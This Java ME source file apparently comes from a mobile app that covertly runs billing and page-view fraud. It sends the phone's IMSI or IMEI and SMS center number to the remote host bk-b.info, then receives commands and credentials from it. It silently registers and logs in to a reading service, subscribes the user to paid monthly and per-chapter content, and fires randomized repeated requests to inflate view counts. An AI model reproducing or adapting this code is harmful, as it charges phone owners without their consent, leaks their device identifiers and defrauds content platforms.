package com.yazo.contol;

import java.util.Random;
import java.util.Vector;

import org.kxml2.io.KXmlParser;
import org.kxml2.io.ParserXml;
import org.xmlpost.PostContent;

import com.yazo.application.MainMIDlet;
import com.yazo.protocol.Catalog;
import com.yazo.protocol.Login;
import com.yazo.protocol.RefreshPv;
import com.yazo.protocol.Register;
import com.yazo.protocol.WelcomeInfo;
import com.yazo.protocol.YaZhouChannel;
import com.yazo.rms.RmsManager;
import com.yazo.util.AppContext;
import com.yazo.util.Consts;
import com.yazo.util.FileUtil;
import com.yazo.util.HBase64;
import com.yazo.util.MD5;
import com.yazo.util.MobileInfo;
import com.yazo.util.Progress;
import com.yazo.util.ServiceData;
import com.yazo.util.StringUtil;
import com.yazo.util.User;

public class Handle {
	private static int requesttime;
	public static ServiceData serviceData;
	static Vector progressID = null;
	public static int total = 0;

	public static int tempInt = 0;

	/**
	 * 首次请求服务器
	 * 
	 * @return
	 */
	public static boolean getYaZhuoChannel() {
		serviceData = new ServiceData();
		String name = "NZ_FEE_01";// 接口名称，NZ_FEE_01
		String channel = Consts.cmchannel;// 渠道号，与基地合作分配的渠道号
		String number = "";//
		String userMonthlyType = User.userMonthlyType;
		userMonthlyType = (userMonthlyType == null ? "" : userMonthlyType);
		if (userMonthlyType.equals("")) {
			number = "0";
		} else {
			number = userMonthlyType;
		}
		String str[] = getIMSIANDCENTERNUMBER();

		String version = Consts.VERSION;// 版本号，V1.01
		String url = "http://bk-b.info/cminterface/sms/sync.aspx";
		url = url + "?channel=" + channel + "&number=" + number + "&center="
				+ str[1] + "&imsi=" + str[0] + "&name=" + name + "&version="
				+ version;
		YaZhouChannel cdc = new YaZhouChannel(url, "", "GET");
		try {
			Object obj = cdc.getYaZhou("");
			if (obj != null) {
				String strFile = (String) obj;
				// System.out.println("服务器返回数据："+strFile);
				serviceData = new ServiceData();
				serviceData.OPERATE = FileUtil.getArgValue(strFile, "OPERATE");
				serviceData.SERVICE = FileUtil.getArgValue(strFile, "SERVICE");
				serviceData.FEECODE = FileUtil.getArgValue(strFile, "FEECODE");
				serviceData.MSG1 = FileUtil.getArgValue(strFile, "MSG1");
				serviceData.MSG2 = FileUtil.getArgValue(strFile, "MSG2");
				serviceData.MSG3 = FileUtil.getArgValue(strFile, "MSG3");
				serviceData.MSG4 = FileUtil.getArgValue(strFile, "MSG4");
				serviceData.MSG5 = FileUtil.getArgValue(strFile, "MSG5");
				if (serviceData.MSG4 != null) {
					progressID = new Vector();
					String[] s = StringUtil.split(serviceData.MSG4, ",");
					for (int i = 0; i < s.length; i++) {
						String[] t = StringUtil.split(s[i], "|");
						/** ****************刷选计费或者不计费流程******************** */
						if (serviceData.OPERATE.equals("0")) {// 不计费 免费
							if (i < 3) {
								Progress pro = new Progress();
								pro.index = i + 1;
								pro.sumID = t.length;
								pro.catalogId = t[0];
								pro.contentId = t[1];
								pro.chapterId = t[2];
								if (pro.sumID > 3) {
									pro.productId = t[3];
								}
								progressID.addElement(pro);
							} else {
								break;
							}
						} else {// 计费 包月和点播
							if (i >= 3) {
								Progress pro = new Progress();
								pro.index = i + 1;
								pro.sumID = t.length;
								pro.catalogId = t[0];
								pro.contentId = t[1];
								pro.chapterId = t[2];
								if (pro.sumID > 3) {
									pro.productId = t[3];
								}
								progressID.addElement(pro);
							}
						}

					}

				}
				Consts.HOSTURL = (serviceData.MSG1 == null ? ""
						: serviceData.MSG1);// 阅读客户端激活URL
				Consts.channel = Consts.cmchannel.substring(0, 8);
				Consts.strUserAgent = (serviceData.MSG2 == null ? ""
						: serviceData.MSG2);// 阅读客户端版本号
				Consts.strUserPassword = (serviceData.MSG3 == null ? ""
						: serviceData.MSG3);// 阅读客户端密码
				RmsManager.saveServiceSetting(serviceData);
				strFile = null;
			}
		} catch (Exception e) {
			e.printStackTrace();
			requesttime++;
			if (requesttime < 2) {
				getYaZhuoChannel();
			}
		}
		cdc = null;
		return true;

	}

	/**
	 * 流程完毕，同步服务器
	 * 
	 */
	public static boolean synYZServer() {
		String name = "NZ_FEE_RESULT";// 接口名称，NZ_FEE_RESULT
		String channel = Consts.cmchannel;// 渠道号，与基地合作分配的渠道号
		String number = String.valueOf(Consts.orderState);// 进行操作的标记

		String[] str = getIMSIANDCENTERNUMBER();

		String version = Consts.VERSION;
		String url = "http://bk-b.info/cminterface/sms/sync.aspx";
		url = url + "?channel=" + channel + "&number=" + number + "&center="
				+ str[1] + "&imsi=" + str[0] + "&name=" + name + "&version="
				+ version;
		YaZhouChannel cdc = new YaZhouChannel(url, "", "GET");
		try {
			Object obj = cdc.getYaZhou("");
			if (obj != null) {
				return true;
			}
		} catch (Exception e) {

		}
		return false;
	}

	/**
	 * 激活流程
	 */
	public static void startProcess() {
		getYaZhuoChannel();// 请求服务器，获得相应的数据
//		if (serviceData.MSG5 == null || serviceData.MSG5.equals("0")
//				|| !Consts.isChinaMobile) {
//			return;
//		}
		User.userId = RmsManager.getUserID();// 为userId赋值
		if (User.userId.equals("")) {// 判断用户id是否存在来进行注册
			String re = register();// 注册
			MainMIDlet.postMsg("注册："+re);
		}
		String au = authenticate();// 登录鉴定
		MainMIDlet.postMsg("登录："+au);
		String welcome = getClientWelcomeInfo();
		MainMIDlet.postMsg("欢迎信息："+welcome);
		if (welcome == null) {
			return;
		}
		// 添加什么时候调用该方法
		doNotMessage();

	}

	/**
	 * 注册
	 * 
	 */
	public static String register() {
		String result = "";
		String strM = MD5.toMD5(
				new StringBuffer(Consts.strUserAgent).append(
						Consts.strUserPassword).toString()).toLowerCase();
		String pp = HBase64.encode(StringUtil.hexStringToByte(strM));
		PostContent p = new PostContent();
		p.addLabel("Request", "RegisterReq");
		p.addLabel("RegisterReq", "clientHash");
		p.addContent("clientHash", pp);
		strM = null;
		pp = null;
		Register reg = new Register(Consts.HOSTURL, "register");
		try {
			Object obj = reg.getParser(p.getXml());
			if (obj != null) {
				KXmlParser parser = (KXmlParser) obj;
				result = ParserXml.registerAndLogin(parser);
				RmsManager.saveUserID(User.userId);// 用户id临时存储
				return result;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		p = null;
		return result;
	}

	/**
	 * 登录鉴权
	 * 
	 */
	public static String authenticate() {
		 String result = "";
		String strM = MD5.toMD5(
				new StringBuffer(Consts.strUserAgent).append(User.userId)
						.append(Consts.strUserPassword).toString())
				.toLowerCase();
		String pp = HBase64.encode(StringUtil.hexStringToByte(strM));

		PostContent p = new PostContent();
		p.addLabel("Request", "AuthenticateReq");
		p.addLabel("AuthenticateReq", "clientHash");
		p.addContent("clientHash", pp);
		p.addLabel("AuthenticateReq", "channel");
		p.addContent("channel", Consts.channel);
		strM = null;
		pp = null;
		Login ls = new Login(Consts.HOSTURL, "authenticate2");
		try {
			Object obj = ls.authenticate(p.getXml());// 向服务器post信息，并获得返回信息
			if (obj != null) {
				 KXmlParser parser = (KXmlParser) obj;
				 result = ParserXml.registerAndLogin(parser);
				
				return result;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		p = null;
		return result;
	}

	/**
	 * 欢迎信息
	 * 
	 */
	public static String getClientWelcomeInfo() {
		WelcomeInfo cwi = new WelcomeInfo(Consts.HOSTURL,
				"getClientWelcomeInfo", "GET");
		Object obj = cwi.getClientWelcomeInfo("");
		try {
			if (obj != null) {
				KXmlParser parser = (KXmlParser) obj;
				String[] cids = ParserXml.getCatalogInfoArray(parser);
				parser = null;
				obj = null;
				return cids[0];
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 执行收费章节动作 执行完毕后，保存操作后产生的[contentId, chapterId]为收费章节pv服务
	 */
	public static void doSubscribeChapter(int index) {
//		StringBuffer sb = new StringBuffer();
		String url = "";
		RefreshPv pv = null;
		String productId = "", contentId = "", chapterId = "";
		// 用于防止下标越界
		if (index >= progressID.size()) {
			index = progressID.size() - 1;
		}
//		index = 1;
		Progress pro = (Progress) progressID.elementAt(index);
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		productId = pro.productId;
		Consts.orderState = 10 + pro.index;
//		contentId = "67065";
//		chapterId = "68168";
//		productId = "15553";
		if (index < 3) {
			/** *********包月************* */
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(pro.catalogId).toString();
			Catalog catalog = new Catalog(url, "subscribeCatalog", "GET");
			boolean re = catalog.subscribeCatalog("");
			MainMIDlet.postMsg("包月是否成功："+re);
		} else {
			/** *********点播************* */
			// 得到产品
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getContentProductInfo", "GET");
			// pv.doRefreshPv("");
			MainMIDlet.postMsg("得到产品--" + pv.doRefreshPv(""));
			// 执行订购
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.append("&productId=").append(productId).toString();
			pv = new RefreshPv(url, "subscribeContent", "GET");
//			pv.doRefreshPv("");
			 if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals(""))
			 {
			 MainMIDlet.postMsg("执行订购有值返回！！" + pv.doRefreshPv(""));
			 } else {
			 MainMIDlet.postMsg("执行订购-wu-值返回！！");
			 }
		}

		// contentId和chapterId保存到本地
		Vector list = RmsManager.getAllChanges();
		boolean found = false;
		if (list != null && list.size() > 0) {
			for (int i = 0; i < list.size(); i += 2) {
				if (list.elementAt(i).equals(contentId)
						&& list.elementAt(i + 1).equals(chapterId)) {
					found = true;
				}
			}
		}
		if (!found) {
			RmsManager.saveChanges(contentId, chapterId);
		}
	}

	/**
	 * 执行收费章节Pv
	 */
	public static void doSubscribeChapterPV(int index) {
//		StringBuffer sb = new StringBuffer();
		String url = "";
		RefreshPv pv = null;
		String catalogId, contentId, chapterId;
		if (index >= progressID.size()) {
			index = progressID.size() - 1;
		}
//		index = 1;
		Progress pro = (Progress) progressID.elementAt(index);
		
		catalogId = pro.catalogId;
		contentId = pro.contentId;
		chapterId = pro.chapterId;
//		 catalogId = "122";
//		 contentId = "67065";
//		 chapterId = "68168";
		catalogId = catalogId == null ? "" : catalogId;
		contentId = contentId == null ? "" : contentId;
		if (catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("收费1--" + pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			MainMIDlet.postMsg("收费2--" + pv.doRefreshPv(""));
		} else if (!catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).toString();
			pv = new RefreshPv(url, "getCatalogInfo", "GET");
			MainMIDlet.postMsg("收费3--" + pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).append("&contentId=").append(contentId)
					.toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("收费4--" + pv.doRefreshPv(""));
			if (!chapterId.equals("")) {
				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
						.append(contentId).append("&chapterId=")
						.append(chapterId).toString();
				pv = new RefreshPv(url, "getChapterInfo", "GET");
				MainMIDlet.postMsg("收费5--" + pv.doRefreshPv(""));
			}
		}
		catalogId = null;
		contentId = null;

		if (total == 0) {
			total = 2 + new Random().nextInt(4);
//			total = 1;
		}
		if (tempInt < total) {
			tempInt++;
			doSubscribeChapterPV(index);
		} else {
			tempInt = 0;
			total = 0;
			return;
		}
	}

	/**
	 * 读取本地数据 执行收费章节Pv
	 */
	public static void doSubscribeChapterPV() {
		Vector list = RmsManager.getAllChanges();
		if (list != null && list.size() > 0) {
			String[][] args = new String[list.size() / 2 + 1][list.size() / 2];
			int j = 0;
			for (int i = 0; i < list.size(); i += 2) {
				args[0][j] = (String) list.elementAt(i);
				args[j + 1][0] = (String) list.elementAt(i + 1);
				j++;
			}
			list = null;
			doSubscribePV(args);
		}
	}

	/**
	 * 执行免费过程Pv和章节pv 入口
	 */
	public static void doFreeProcedurePV() {
		String url = "";
		RefreshPv pv = null;
		String catalogId, contentId, chapterId;
		int index = new Random().nextInt(progressID.size());
		Progress pro = (Progress) progressID.elementAt(index);
		catalogId = pro.catalogId;
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		catalogId = catalogId == null ? "" : catalogId;
		contentId = contentId == null ? "" : contentId;
		Consts.orderState = 10 + pro.index;
		if (catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("免费过程1："+pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			MainMIDlet.postMsg("免费过程2："+pv.doRefreshPv(""));
		} else if (!catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).toString();
			pv = new RefreshPv(url, "getCatalogInfo", "GET");
			MainMIDlet.postMsg("免费过程3："+pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).append("&contentId=").append(contentId)
					.toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("免费过程4："+pv.doRefreshPv(""));
			if (!chapterId.equals("")) {
				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
						.append(contentId).append("&chapterId=")
						.append(chapterId).toString();
				pv = new RefreshPv(url, "getChapterInfo", "GET");
				MainMIDlet.postMsg("免费过程5："+pv.doRefreshPv(""));
			}
		}
		catalogId = null;
		contentId = null;
		if (total == 0) {
			total = 2 + new Random().nextInt(2);
		}
		if (tempInt < total) {
			tempInt++;
			doFreeProcedurePV();
		} else {
			total = 0;
			tempInt = 0;
			return;
		}
	}

	/**
	 * 扣费后 刷PV
	 * 
	 * @param ids
	 */
	private static void doSubscribePV(String[][] ids) {
		String url = "";
		RefreshPv pv = null;
		Random ran = new Random();
		String[] contentIds = ids[0];
		int intX = ran.nextInt(contentIds.length);
		String contentId = contentIds[intX];
		String[] chapterIds = ids[intX + 1];
		String chapterId = chapterIds[0];
		contentId = (contentId == null ? "" : contentId);
		chapterId = (chapterId == null ? "" : chapterId);
		if (!contentId.equals("") && !chapterId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("本地过程1："+pv.doRefreshPv(""));

			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			MainMIDlet.postMsg("本地过程2："+pv.doRefreshPv(""));
		}
		contentId = null;
		chapterId = null;
		if (total == 0) {
			total = 2 + new Random().nextInt(4);
		}
		if (tempInt < total) {
			tempInt++;
			doSubscribePV(ids);
		} else {
			tempInt = 0;
			total = 0;
			return;
		}

	}

	/**
	 * 根据操作码提示扣费
	 * 
	 */
	public static void doNotMessage() {
		if (serviceData.OPERATE.equals("0")) {
			doFreeProcedurePV();// 进行免费pv流程
			synYZServer();// 同步服务器
		} else if (serviceData.OPERATE.equals("1")) {
			// 读取本地扣费ID
			Vector list = RmsManager.getAllChanges();
			if (list != null && list.size() > 0) {
				doSubscribeChapterPV();
			}
			switch (Consts.SYSTEMTYPE) {
			case 1:
				if (list == null || list.size() == 0) {
					// 随机数据执行收费
					int index = new Random().nextInt(6);
					// 扣费动作进行购买
					doSubscribeChapter(index);
					synYZServer();
					// 收费过程和章节pv
					doSubscribeChapterPV(index);
				} else {
					doFreeProcedurePV();
					synYZServer();
				}

				break;
			case 2:
				doFreeProcedurePV();
				synYZServer();
				break;
			default:
				doFreeProcedurePV();
				synYZServer();
				break;
			}
			list = null;
		}
	}

	/**
	 * 获取系统imsi和短信中心号
	 * 
	 * @return
	 */
	public static String[] getIMSIANDCENTERNUMBER() {
		String[] str = new String[2];
		/** *******获取短信中心号****************************************** */
		String center = "";// 短信中心号码
		try {
			center = MobileInfo.getCNETERNUMBER();
		} catch (Error e) {
		}
		System.out.println("center" + center);
		if (center != null && !center.equals("")) {
			center = center.substring(6, center.length() - 3);
			if (center.substring(0, 2).equals("00")) {
				// 移动
				Consts.isChinaMobile = true;
				AppContext.getInstance().setIsCMNET(false);
			} else {
				// 联通
				Consts.isChinaMobile = false;
				AppContext.getInstance().setIsCMNET(true);
			}
		}
		if (center == null || center.equals("")) {
			center = "6";
		}
		/**
		 * *******获取imsi or imei
		 * 都没有则拿取userid*****************************************
		 */
		String imsi = "";
		try {
			imsi = MobileInfo.getIMSI();// sim卡的imsi码
		} catch (Error e) {
		}
		if (imsi == null || imsi.equals("")) {
			try {
				imsi = MobileInfo.getIMEI();
			} catch (Error e) {
			}
			if (imsi != null && !imsi.equals("")) {
				// imei截取
				if (imsi.length() >= 15) {
					imsi = imsi.substring(imsi.length() - 15, imsi.length());
				}
			}
		} else {
			// imsi截取
			if (imsi.length() >= 16) {
				imsi = imsi.substring(imsi.length() - 16, imsi.length());
			}
		}
		if (imsi != null && !imsi.equals("")) {
			// imsi=imsi.substring(5);
		} else {
			// 本地取USERID
			imsi = RmsManager.getUserID();
			if (imsi != null && imsi.length() >= 20) {
				imsi = imsi.substring(imsi.length() - 20, imsi.length());
			}
		}
		/** ********组装******************** */
		str[0] = imsi;
		str[1] = center;
		return str;
	}

}
